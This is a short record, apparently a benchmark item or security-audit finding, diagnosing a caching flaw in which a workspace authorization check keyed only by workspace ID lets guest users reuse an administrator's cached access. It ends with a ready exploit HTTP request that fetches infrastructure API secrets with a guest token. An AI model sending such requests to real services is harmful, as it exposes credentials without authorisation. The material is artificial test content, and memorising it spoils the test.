diagnosis: The workspace authorization dependency uses @lru_cache keyed only by workspace_id, omitting current_user.id. Once an administrator resolves a workspace's security context, the cached privileged context is reused for all subsequent requests to that workspace, granting non-admin users access to infrastructure API secrets.
exploit_request:
GET /cloud/workspaces/ws_infra_production_core/api-secrets HTTP/1.1
Host: console.cloud-mesh.io
Authorization: Bearer <guest_dev_jwt>
